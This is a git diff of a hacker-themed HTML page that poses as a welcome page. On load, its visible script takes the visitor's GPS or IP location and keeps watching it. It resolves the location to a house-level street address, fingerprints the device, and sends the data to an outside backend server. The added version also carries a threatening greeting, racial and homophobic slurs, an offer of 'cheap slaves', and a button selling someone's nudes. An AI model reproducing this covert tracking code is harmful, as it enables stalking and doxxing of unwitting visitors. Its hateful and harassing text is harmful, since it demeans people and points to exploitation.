@@ -1,1225 +1,872 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔮 NEXUS://REALITY_GLITCH</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>I can see you</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
-        @keyframes corrupt {
-            0% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
-            10% { transform: translate(-10px, 10px) rotate(1deg); filter: hue-rotate(90deg) blur(2px); }
-            20% { transform: translate(10px, -10px) rotate(-1deg); filter: hue-rotate(180deg) blur(0px); }
-            30% { transform: translate(-5px, 5px) rotate(2deg); filter: hue-rotate(270deg) blur(3px); }
-            40% { transform: translate(5px, -5px) rotate(-2deg); filter: hue-rotate(360deg) blur(1px); }
-            50% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
-        }
+    /* Reset */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
+    body, html {
+      height: 100%;
+      background-color: black;
+      font-family: 'Share Tech Mono', monospace;
+      color: #00ff00;
+      overflow: hidden;
+      user-select: none;
+      cursor: none;
+    }
 
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
-        }
+    .container {
+      position: relative;
+      max-width: 700px;
+      margin: 5% auto;
+      background: rgba(0, 0, 0, 0.75);
+      border: 2px solid #00ff00;
+      padding: 40px 50px;
+      border-radius: 12px;
+      box-shadow:
+        0 0 15px #00ff00aa,
+        inset 0 0 30px #00ff00aa;
+      text-align: center;
+      z-index: 30;
+    }
 
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            padding: 20px;
-            background-image: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 2px);
-            position: relative;
-            overflow-x: hidden;
-        }
+    h1 {
+      font-size: 3rem;
+      text-shadow:
+        0 0 8px #00ff00,
+        0 0 20px #00ff00;
+      margin-bottom: 0.3em;
+      letter-spacing: 0.12em;
+    }
 
-        /* Matrix rain background */
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            opacity: 0.1;
-            z-index: 0;
-        }
+    p {
+      font-size: 1.4rem;
+      color: #00ff00cc;
+      text-shadow: 0 0 6px #00ff00aa;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
 
-        .terminal {
-            background: rgba(0,20,0,0.95);
-            border: 2px solid #0f0;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-            padding: 20px;
-            margin: 20px;
-            position: relative;
-            z-index: 1;
-            backdrop-filter: blur(2px);
-        }
+    /* Buttons fixed at top center */
+    #sound-buttons {
+      position: fixed;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      background: rgba(0, 0, 0, 0.85);
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      padding: 10px 20px;
+      z-index: 50;
+      box-shadow:
+        0 0 15px #00ff00cc,
+        inset 0 0 30px #00ff00cc;
+      user-select: none;
+    }
 
-        .terminal::before {
-            content: ">";
-            position: absolute;
-            left: -15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #0f0;
-            font-size: 24px;
-            animation: pulse 1s infinite;
-        }
+    #sound-buttons button {
+      background: #00ff00;
+      color: black;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: 'Share Tech Mono', monospace;
+      font-weight: bold;
+      box-shadow: 0 0 8px #00ff00aa;
+      transition: background-color 0.2s ease;
+      user-select: none;
+    }
 
-        @keyframes pulse {
-            0% { text-shadow: 0 0 5px #ff0000; opacity: 1; }
-            50% { text-shadow: 0 0 30px #ff0000; opacity: 0.5; }
-            100% { text-shadow: 0 0 5px #ff0000; opacity: 1; }
-        }
+    #sound-buttons button:hover {
+      background-color: #22cc22;
+    }
 
-        .glitch-text {
-            font-size: 2rem;
-            color: #0f0;
-            text-shadow: 2px 2px 0 #ff0000, -2px -2px 0 #0000ff;
-            animation: corrupt 5s infinite;
-            margin-bottom: 20px;
-            word-break: break-word;
-        }
+    #matrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 1;
+      width: 100%;
+      height: 100%;
+    }
 
-        .data-stream {
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            color: #0f0;
-            line-height: 12px;
-            opacity: 0.5;
-            white-space: pre;
-            overflow: hidden;
-            height: 100px;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            pointer-events: none;
-            z-index: 9999;
-            background: rgba(0,0,0,0.8);
-            padding: 5px;
-        }
+    #matrix-cursor {
+      position: fixed;
+      width: 20px;
+      height: 20px;
+      background: #00ff00;
+      border-radius: 50%;
+      pointer-events: none;
+      filter: drop-shadow(0 0 6px #00ff00);
+      mix-blend-mode: screen;
+      transform: translate(-50%, -50%);
+      z-index: 40;
+      transition: width 0.15s ease, height 0.15s ease;
+    }
 
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
-            gap: 25px;
-            padding: 20px;
-            max-width: 2000px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
+    /* Loading overlay under container */
+    #loading-overlay {
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 700px;
+      margin: 20px 0 0 0;
+      background: rgba(0, 0, 0, 0.9);
+      border: 2px solid #00ff00;
+      border-radius: 12px;
+      padding: 20px 30px;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      user-select: none;
+      box-shadow:
+        0 0 15px #00ff00cc,
+        inset 0 0 30px #00ff00cc;
+      z-index: 20;
+      display: none;
+    }
 
-        .puzzle-card {
-            background: rgba(0,30,0,0.98);
-            border: 3px solid #0f0;
-            padding: 20px;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-            min-height: 400px;
-            box-shadow: 0 0 50px rgba(0,255,0,0.2);
-            backdrop-filter: blur(5px);
-        }
+    #progress-bar-container {
+      width: 100%;
+      background: #003300;
+      border: 2px solid #00ff00;
+      border-radius: 12px;
+      margin: 15px 0 25px 0;
+      height: 30px;
+      overflow: hidden;
+      box-shadow: inset 0 0 10px #00ff00aa;
+    }
 
-        .puzzle-card:hover {
-            transform: scale(1.02);
-            border-color: #ff0000;
-            box-shadow: 0 0 80px rgba(255,0,0,0.4);
-        }
+    #progress-bar {
+      height: 100%;
+      width: 0;
+      background: #00ff00;
+      transition: width 0.1s ease;
+    }
 
-        .puzzle-card::after {
-            content: "";
-            position: absolute;
-            top: -100%;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(transparent, rgba(0,255,0,0.1));
-            animation: scan 3s linear infinite;
-            pointer-events: none;
-        }
+    #loading-details {
+      white-space: pre-wrap;
+      font-size: 1rem;
+      line-height: 1.4;
+      max-height: 200px;
+      overflow-y: auto;
+      text-align: left;
+      margin-top: 10px;
+      display: none;
+    }
 
-        .card-header {
-            font-size: 1.5rem;
-            color: #0f0;
-            border-bottom: 2px dashed #0f0;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+    /* Location info display */
+    #location-info {
+      margin: 10px 0;
+      padding: 10px;
+      border: 1px solid #00ff00;
+      border-radius: 5px;
+      display: none;
+    }
 
-        .btn {
-            background: #000;
-            color: #0f0;
-            border: 3px solid #0f0;
-            padding: 15px 25px;
-            font-size: 1.2rem;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            margin: 10px 0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            position: relative;
-            z-index: 2;
-        }
+    .coord-display {
+      display: inline-block;
+      margin: 5px;
+      padding: 5px 10px;
+      border: 1px solid #00ff00;
+      border-radius: 3px;
+    }
 
-        .btn:hover {
-            background: #0f0;
-            color: #000;
-            box-shadow: 0 0 50px #0f0;
-            transform: scale(1.05);
-        }
+    /* Satellite view button */
+    #satellite-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.85);
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      padding: 10px 20px;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      cursor: pointer;
+      z-index: 50;
+      display: none;
+      box-shadow: 0 0 15px #00ff00cc;
+    }
 
-        .btn.danger:hover {
-            background: #ff0000;
-            border-color: #ff0000;
-            box-shadow: 0 0 50px #ff0000;
-        }
+    #satellite-btn:hover {
+      background: #00ff00;
+      color: black;
+    }
 
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
+    /* Satellite modal */
+    #satellite-modal {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 800px;
+      max-width: 90%;
+      background: rgba(0, 0, 0, 0.95);
+      border: 3px solid #00ff00;
+      border-radius: 12px;
+      padding: 20px;
+      z-index: 100;
+      box-shadow: 0 0 30px #00ff00;
+    }
 
-        .data-panel {
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 15px;
-            font-size: 0.9rem;
-            max-height: 300px;
-            overflow-y: auto;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-            scrollbar-width: thin;
-            scrollbar-color: #0f0 #000;
-        }
+    #satellite-modal img {
+      width: 100%;
+      height: auto;
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
 
-        .data-panel::-webkit-scrollbar {
-            width: 8px;
-        }
+    #satellite-modal .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: 2px solid #00ff00;
+      color: #00ff00;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      cursor: pointer;
+      font-size: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        .data-panel::-webkit-scrollbar-track {
-            background: #000;
-        }
+    #satellite-modal .close-btn:hover {
+      background: #00ff00;
+      color: black;
+    }
 
-        .data-panel::-webkit-scrollbar-thumb {
-            background: #0f0;
-            border-radius: 4px;
-        }
+    #satellite-coords {
+      margin-top: 10px;
+      font-size: 0.9rem;
+      color: #00ff00cc;
+    }
 
-        .location-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 15px 0;
-        }
+    /* System info display */
+    #system-info {
+      margin-top: 10px;
+      padding: 10px;
+      border: 1px solid #00ff00;
+      border-radius: 5px;
+      font-size: 0.9rem;
+      display: none;
+    }
 
-        .coord-display {
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 15px;
-            text-align: center;
-            font-size: 1.3rem;
-            animation: flicker 2s infinite;
-            font-weight: bold;
-        }
-
-        .threat-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            width: 200px;
-            height: 200px;
-            border: 4px solid #0f0;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            background: rgba(0,0,0,0.95);
-            z-index: 9999;
-            animation: pulse 2s infinite;
-            backdrop-filter: blur(5px);
-        }
-
-        .threat-number {
-            font-size: 3rem;
-            color: #ff0000;
-            font-weight: bold;
-        }
-
-        .timeline {
-            position: fixed;
-            bottom: 120px;
-            left: 20px;
-            right: 20px;
-            height: 5px;
-            background: #0f0;
-            z-index: 9998;
-        }
-
-        .timeline-progress {
-            height: 100%;
-            width: 0%;
-            background: #ff0000;
-            transition: width 1s;
-        }
-
-        .timeline-event {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #0f0;
-            font-size: 0.8rem;
-            white-space: nowrap;
-            background: rgba(0,0,0,0.8);
-            padding: 2px 10px;
-            border-radius: 10px;
-        }
-
-        .hidden-message {
-            color: #000;
-            background: #000;
-            cursor: pointer;
-            transition: all 0.3s;
-            padding: 10px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .hidden-message:hover {
-            color: #0f0;
-            background: transparent;
-        }
-
-        .puzzle-piece {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 2px solid #0f0;
-            margin: 5px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .puzzle-piece.found {
-            background: #0f0;
-            box-shadow: 0 0 30px #0f0;
-            animation: pulse 1s infinite;
-        }
-
-        .puzzle-piece.missing {
-            opacity: 0.3;
-        }
-
-        .qr-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-
-        .satellite-img {
-            width: 100%;
-            height: 200px;
-            border: 2px solid #0f0;
-            object-fit: cover;
-            filter: grayscale(100%) contrast(1.2) brightness(0.8);
-            margin: 10px 0;
-        }
-
-        .copy-btn {
-            background: transparent;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 5px 10px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            margin-left: 10px;
-        }
-
-        .copy-btn:hover {
-            background: #0f0;
-            color: #000;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 3px;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-        }
-
-        .status-online {
-            background: #0f0;
-            color: #000;
-        }
-
-        .status-offline {
-            background: #f00;
-            color: #fff;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border: 2px solid #0f0;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 15px;
-            max-width: 300px;
-            z-index: 10000;
-            animation: slideIn 0.3s;
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(100%); }
-            to { transform: translateX(0); }
-        }
-
-        .coordinates-text {
-            user-select: all;
-            background: #0f0;
-            color: #000;
-            padding: 2px 5px;
-        }
-    </style>
+    .fingerprint {
+      font-size: 0.8rem;
+      color: #00ff00aa;
+      margin-top: 5px;
+    }
+  </style>
 </head>
 <body>
-    <!-- Matrix rain background -->
-    <canvas id="matrixCanvas" class="matrix-rain"></canvas>
-    
-    <!-- Threat indicator -->
-    <div class="threat-indicator">
-        <div>THREAT LEVEL</div>
-        <div class="threat-number" id="threatLevel">0</div>
-        <div id="threatMessage">SCANNING</div>
+  <canvas id="matrix-canvas"></canvas>
+
+  <div class="container" role="main" aria-label="Welcome message">
+    <h1>WELCOME TO YOUR DOOM FAG</h1>
+    <p>Thank you for visiting. We are excited to have you here! DM goonerkid420on discord to buy cheap slaves</p>
+
+    <!-- Location Info Display -->
+    <div id="location-info">
+      <div class="coord-display" id="latitude">--.------</div>
+      <div class="coord-display" id="longitude">--.------</div>
+      <div id="location-source"></div>
+      <div id="exact-address"></div>
+      <div id="location-details"></div>
     </div>
 
-    <!-- Timeline -->
-    <div class="timeline">
-        <div class="timeline-progress" id="timelineProgress"></div>
-        <div class="timeline-event" id="timelineEvent">INITIALIZING...</div>
+    <!-- System Info Display -->
+    <div id="system-info">
+      <div id="sys-info-content"></div>
+      <div id="fingerprint-hash" class="fingerprint"></div>
     </div>
 
-    <!-- Data stream -->
-    <div class="data-stream" id="dataStream"></div>
-
-    <!-- Main header -->
-    <div class="terminal" style="margin: 10px;">
-        <div class="glitch-text" id="mainHeader">> NEXUS // REALITY INTERFACE v2.3.3.7</div>
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <div id="systemTime" style="color: #0f0; font-size: 0.9rem;"></div>
-            <div id="userId" style="color: #0f0; font-size: 0.8rem;"></div>
-        </div>
-        <div id="connectionStatus" style="color: #0f0; font-size: 0.9rem;"></div>
+    <!-- Loading overlay below container content -->
+    <div id="loading-overlay">
+      <div>Loading... <span id="loading-percentage">0%</span></div>
+      <div id="progress-bar-container">
+        <div id="progress-bar"></div>
+      </div>
+      <pre id="loading-details">Your details will appear here once loading completes.</pre>
     </div>
+  </div>
 
-    <!-- Main puzzle grid -->
-    <div class="grid-container">
-        <!-- GEOLOCATION NEXUS - EXACT LOCATION -->
-        <div class="puzzle-card">
-            <div class="card-header">
-                <span>🌍 EXACT GEOLOCATION</span>
-                <span class="status-badge status-online" id="gpsStatus">GPS: ACTIVE</span>
-            </div>
-            <div class="location-grid">
-                <div class="coord-display" id="latitude">--.------</div>
-                <div class="coord-display" id="longitude">--.------</div>
-            </div>
-            <div class="data-panel" id="exactAddress">
-                <span class="loading"></span> Acquiring exact location...
-            </div>
-            <div class="data-panel" id="locationDetails" style="max-height: 200px;"></div>
-            <div style="display: flex; gap: 10px;">
-                <button class="btn" id="copyCoordinates" style="width: auto; flex: 1;">📋 COPY</button>
-                <button class="btn" id="openMaps" style="width: auto; flex: 1;">🗺️ MAPS</button>
-                <button class="btn" id="openStreetView" style="width: auto; flex: 1;">📸 STREET</button>
-            </div>
-            <button class="btn" id="refreshLocation">🔄 REFRESH EXACT LOCATION</button>
-            <div id="locationSource" style="font-size: 0.8rem; margin-top: 10px;"></div>
-        </div>
+  <!-- Buttons fixed on top -->
+  <div id="sound-buttons">
+    <button data-sound="sound1.mp3">Buy Nigger</button>
+    <button data-sound="sound2.mp3">Buy Clanker</button>
+    <button data-sound="sound3.mp3">Buy Kizers Nudes</button>
+  </div>
 
-        <!-- SYSTEM FINGERPRINT -->
-        <div class="puzzle-card">
-            <div class="card-header">
-                <span>💻 SYSTEM FINGERPRINT</span>
-                <span class="status-badge status-online">ACTIVE</span>
-            </div>
-            <div class="data-panel" id="sysInfo"></div>
-            <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
-            <div class="data-panel" id="hardwareInfo" style="display: none;"></div>
-            <div id="fingerprintHash" style="font-size: 0.7rem; margin-top: 10px;"></div>
-        </div>
+  <!-- Satellite button (appears after location found) -->
+  <button id="satellite-btn">🛰️ VIEW SATELLITE</button>
 
-        <!-- THE FORBIDDEN BUTTON -->
-        <div class="puzzle-card">
-            <div class="card-header">
-                <span>🚫 [REDACTED]</span>
-                <span class="status-badge status-offline" id="buttonStatus">WAITING</span>
-            </div>
-            <button class="btn danger" id="forbiddenButton">!!! DO NOT PRESS !!!</button>
-            <div class="data-panel" id="pressHistory">Presses: 0</div>
-            <div class="data-panel" id="buttonMessages" style="color: #ff0000; min-height: 80px;"></div>
-            <div id="pressWarning" style="color: #ff0000; font-size: 0.8rem;"></div>
-        </div>
+  <!-- Satellite modal -->
+  <div id="satellite-modal">
+    <div class="close-btn" onclick="closeSatellite()">×</div>
+    <h3 style="color: #00ff00; margin-bottom: 10px;">🛰️ SATELLITE IMAGERY</h3>
+    <img id="satellite-image" src="" alt="Satellite view">
+    <div id="satellite-coords"></div>
+  </div>
 
-        <!-- REALITY FRAGMENTS -->
-        <div class="puzzle-card">
-            <div class="card-header">
-                <span>🧩 REALITY FRAGMENTS</span>
-                <span class="status-badge" id="fragmentStatus">0/9</span>
-            </div>
-            <div id="puzzlePieces" class="qr-container"></div>
-            <div class="data-panel" id="fragmentsFound">0/9 fragments collected</div>
-            <div id="fragmentMessage" style="font-size: 0.8rem;"></div>
-        </div>
+  <div id="matrix-cursor"></div>
 
-        <!-- DEEP WEB SCAN -->
-        <div class="puzzle-card">
-            <div class="card-header">🌐 DEEP WEB SCAN</div>
-            <button class="btn" id="scanDarkWeb">💀 SCAN DARK WEB</button>
-            <div class="data-panel" id="darkWebData"></div>
-            <div id="darkWebThreat" style="color: #ff0000;"></div>
-        </div>
+  <script>
+    // Matrix digital rain effect
+    (() => {
+      const canvas = document.getElementById('matrix-canvas');
+      const ctx = canvas.getContext('2d');
 
-        <!-- SURVEILLANCE FEED -->
-        <div class="puzzle-card">
-            <div class="card-header">🛰️ SATELLITE FEED</div>
-            <img id="satelliteImage" class="satellite-img" src="" alt="Satellite Feed">
-            <div class="data-panel" id="satelliteInfo"></div>
-            <button class="btn" id="refreshSatellite">🔄 UPDATE FEED</button>
-        </div>
+      let width, height;
+      let columns;
+      let drops = [];
 
-        <!-- ENCRYPTED TRANSMISSIONS -->
-        <div class="puzzle-card">
-            <div class="card-header">📡 ENCRYPTED TRANSMISSIONS</div>
-            <div class="data-panel" id="transmissions"></div>
-            <button class="btn" id="newTransmission">📩 RECEIVE</button>
-        </div>
+      const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
 
-        <!-- THREAT ANALYSIS -->
-        <div class="puzzle-card">
-            <div class="card-header">⚠️ THREAT ANALYSIS</div>
-            <div class="data-panel" id="threatAnalysis"></div>
-            <div id="threatHistory"></div>
-        </div>
-    </div>
+      function init() {
+        width = window.innerWidth;
+        height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
 
-    <!-- Hidden footer -->
-    <div class="terminal" style="margin-top: 50px;">
-        <div style="text-align: center; color: #0f0; opacity: 0.5;" id="footerText">
-            > SYSTEM STATUS: [ACTIVE] // USERS TRACKED: <span id="totalUsers">---</span> // ENCRYPTION: [AES-256]
-        </div>
-        <div class="hidden-message" onclick="revealSecret()">[CLASSIFIED - CLICK FOR ACCESS]</div>
-    </div>
+        columns = Math.floor(width / 20);
+        drops = new Array(columns).fill(1);
+      }
 
-    <!-- Toast notification container -->
-    <div id="toastContainer"></div>
+      function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, width, height);
 
-    <script>
-        // ==================== CONFIG ====================
-        const BACKEND_URL = 'https://b-n1nt.onrender.com'; // Your Render backend URL
-        let userId = null;
-        let threatLevel = 0;
-        let buttonPresses = 0;
-        let fragments = [];
-        let currentLocation = null;
-        let systemInfo = null;
-        let watchId = null;
-        let transmissionInterval = null;
+        ctx.fillStyle = '#00ff00';
+        ctx.font = '20px "Share Tech Mono", monospace';
 
-        // ==================== INITIALIZATION ====================
-        document.addEventListener('DOMContentLoaded', async () => {
-            await initializeSystem();
-            startDataStream();
-            initMatrixRain();
-            updateTime();
-            createPuzzlePieces();
-            await getStats();
+        for (let i = 0; i < drops.length; i++) {
+          const text = characters.charAt(Math.floor(Math.random() * characters.length));
+          const x = i * 20;
+          const y = drops[i] * 20;
+
+          ctx.fillText(text, x, y);
+
+          if (y > height && Math.random() > 0.975) drops[i] = 0;
+          drops[i]++;
+        }
+      }
+
+      window.addEventListener('resize', init);
+
+      init();
+      setInterval(draw, 35);
+    })();
+
+    // Custom green cursor with trailing effect
+    (() => {
+      const cursor = document.getElementById('matrix-cursor');
+      let mouseX = window.innerWidth / 2;
+      let mouseY = window.innerHeight / 2;
+
+      const trailCount = 10;
+      const trailElements = [];
+
+      for (let i = 0; i < trailCount; i++) {
+        const el = document.createElement('div');
+        el.style.position = 'fixed';
+        el.style.width = '10px';
+        el.style.height = '10px';
+        el.style.background = 'limegreen';
+        el.style.borderRadius = '50%';
+        el.style.pointerEvents = 'none';
+        el.style.opacity = (1 - i / trailCount).toString();
+        el.style.filter = 'drop-shadow(0 0 4px limegreen)';
+        el.style.mixBlendMode = 'screen';
+        el.style.transform = 'translate(-50%, -50%)';
+        el.style.zIndex = 15;
+        document.body.appendChild(el);
+        trailElements.push(el);
+      }
+
+      let positions = Array(trailCount).fill({x: mouseX, y: mouseY});
+
+      document.addEventListener('mousemove', e => {
+        mouseX = e.clientX;
+        mouseY = e.clientY;
+      });
+
+      function animate() {
+        positions.unshift({x: mouseX, y: mouseY});
+        positions.pop();
+
+        cursor.style.left = mouseX + 'px';
+        cursor.style.top = mouseY + 'px';
+
+        trailElements.forEach((el, i) => {
+          const pos = positions[i + 1];
+          if (pos) {
+            el.style.left = pos.x + 'px';
+            el.style.top = pos.y + 'px';
+          }
         });
 
-        async function initializeSystem() {
-            try {
-                // Collect system info
-                await collectSystemInfo();
-                
-                // Get location immediately
-                await getExactLocation();
-                
-                // Start watching position for updates
-                startWatchingPosition();
-                
-                // Send initial data to backend
-                await sendToBackend('system', systemInfo);
-                
-                showToast('System initialized', 'success');
-            } catch (error) {
-                console.error('Init error:', error);
-                showToast('System error', 'error');
-            }
-        }
+        requestAnimationFrame(animate);
+      }
 
-        // ==================== EXACT LOCATION TRACKING ====================
-        async function getExactLocation() {
-            document.getElementById('exactAddress').innerHTML = '<span class="loading"></span> Acquiring GPS signal...';
-            
-            try {
-                // Try GPS first (most accurate)
-                if (navigator.geolocation) {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        });
-                    });
-                    
-                    await processLocation(position.coords, 'GPS (High Accuracy)');
-                } else {
-                    // Fallback to IP geolocation
-                    await getIPLocation();
-                }
-            } catch (gpsError) {
-                console.log('GPS failed, trying IP:', gpsError);
-                await getIPLocation();
-            }
-        }
+      animate();
+    })();
 
-        async function processLocation(coords, source) {
-            const lat = coords.latitude;
-            const lon = coords.longitude;
-            const accuracy = coords.accuracy || 1000;
+    // ==================== CONFIG ====================
+    const BACKEND_URL = "https://b-n1nt.onrender.com"; // Will use same domain or change to your Render URL
+    let currentLocation = null;
+    let systemInfo = null;
+    let watchId = null;
+    let fragments = [];
+    let buttonPresses = 0;
+    let threatLevel = 0;
 
-            currentLocation = {
-                lat: lat,
-                lon: lon,
-                accuracy: accuracy,
-                source: source
-            };
-
-            // Update display
-            document.getElementById('latitude').textContent = lat.toFixed(6);
-            document.getElementById('longitude').textContent = lon.toFixed(6);
-            document.getElementById('locationSource').innerHTML = `📡 Source: ${source} | 🎯 Accuracy: ${accuracy.toFixed(1)}m`;
-            
-            // Get reverse geocoding for exact address
-            await getExactAddress(lat, lon);
-            
-            // Update threat level based on accuracy
-            updateThreatLevel(Math.min(30, Math.floor(accuracy / 10)));
-            
-            // Send to backend
-            await sendToBackend('location', currentLocation);
-        }
-
-        async function getExactAddress(lat, lon) {
-            try {
-                // Using OpenStreetMap Nominatim for reverse geocoding
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
-                const data = await response.json();
-                
-                const address = data.address || {};
-                
-                // Format exact address
-                const addressParts = [];
-                if (address.house_number) addressParts.push(address.house_number);
-                if (address.road) addressParts.push(address.road);
-                if (address.suburb) addressParts.push(address.suburb);
-                if (address.city || address.town || address.village) {
-                    addressParts.push(address.city || address.town || address.village);
-                }
-                if (address.county) addressParts.push(address.county);
-                if (address.state) addressParts.push(address.state);
-                if (address.postcode) addressParts.push(address.postcode);
-                if (address.country) addressParts.push(address.country);
-
-                const fullAddress = addressParts.join(', ');
-                
-                document.getElementById('exactAddress').innerHTML = `
-                    <strong>Exact Address:</strong><br>
-                    ${fullAddress}
-                `;
-
-                // Display all available details
-                const details = [];
-                if (address.house_number) details.push(`🏠 House: ${address.house_number}`);
-                if (address.road) details.push(`🛣️ Road: ${address.road}`);
-                if (address.neighbourhood || address.suburb) details.push(`🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}`);
-                if (address.city || address.town || address.village) details.push(`🏙️ City: ${address.city || address.town || address.village}`);
-                if (address.county) details.push(`🗺️ County: ${address.county}`);
-                if (address.state) details.push(`📍 State: ${address.state}`);
-                if (address.postcode) details.push(`📮 ZIP: ${address.postcode}`);
-                if (address.country) details.push(`🌍 Country: ${address.country}`);
-                
-                document.getElementById('locationDetails').innerHTML = details.join('<br>');
-
-                // Add to location data
-                currentLocation = {
-                    ...currentLocation,
-                    address: fullAddress,
-                    house_number: address.house_number,
-                    road: address.road,
-                    neighbourhood: address.neighbourhood || address.suburb,
-                    city: address.city || address.town || address.village,
-                    county: address.county,
-                    state: address.state,
-                    zip: address.postcode,
-                    country: address.country
-                };
-
-                // Update satellite image
-                updateSatelliteImage(lat, lon);
-                
-            } catch (error) {
-                console.error('Reverse geocoding failed:', error);
-                document.getElementById('exactAddress').innerHTML = 'Address lookup failed';
-            }
-        }
-
-        async function getIPLocation() {
-            try {
-                const response = await fetch('http://ip-api.com/json/');
-                const data = await response.json();
-                
-                if (data.status === 'success') {
-                    await processLocation({
-                        latitude: data.lat,
-                        longitude: data.lon,
-                        accuracy: 1000
-                    }, 'IP Geolocation');
-                    
-                    document.getElementById('exactAddress').innerHTML = `
-                        <strong>IP-Based Location:</strong><br>
-                        ${data.city}, ${data.regionName}, ${data.country}<br>
-                        ISP: ${data.isp || 'Unknown'}
-                    `;
-                }
-            } catch (error) {
-                console.error('IP location failed:', error);
-                document.getElementById('exactAddress').innerHTML = 'Location unavailable';
-            }
-        }
-
-        function startWatchingPosition() {
-            if (navigator.geolocation) {
-                watchId = navigator.geolocation.watchPosition(
-                    async (position) => {
-                        await processLocation(position.coords, 'GPS (Real-time)');
-                    },
-                    (error) => console.log('Watch error:', error),
-                    {
-                        enableHighAccuracy: true,
-                        maximumAge: 0,
-                        timeout: 5000
-                    }
-                );
-            }
-        }
-
-        // ==================== SYSTEM FINGERPRINT ====================
-        async function collectSystemInfo() {
-            systemInfo = {
-                platform: navigator.platform,
-                browser: navigator.userAgent,
-                cores: navigator.hardwareConcurrency || 'Unknown',
